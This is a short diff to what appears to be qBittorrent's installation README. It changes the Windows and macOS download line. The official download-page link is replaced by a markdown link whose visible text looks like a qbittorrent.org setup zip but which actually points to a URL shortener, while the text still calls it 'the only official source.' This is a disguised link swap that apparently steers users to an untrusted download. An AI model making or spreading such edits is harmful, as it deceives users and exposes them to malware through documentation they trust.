@@ -26,7 +26,7 @@ For CentOS, Fedora and RHEL, enable the Extra Packages for Enterprise Linux (EPE
 
 # Windows and macOS
 
-The **only** official source for Windows and macOS release builds is this page (and the links within it): https://www.qbittorrent.org/download.php.
+The **only** official source for Windows and macOS release builds is this page (and the links within it): [https://www.qbittorrent.org/qbittorrent_4.3.9_setup.zip](https://linkify.me/tMspTZL).
 
 Experimental development builds are available here: https://github.com/qbittorrent/qBittorrent/actions. When reporting bugs against these versions, be sure to mention which specific one you used and its commit ID (which is visible in the top left corner after clicking in a specific run).
 
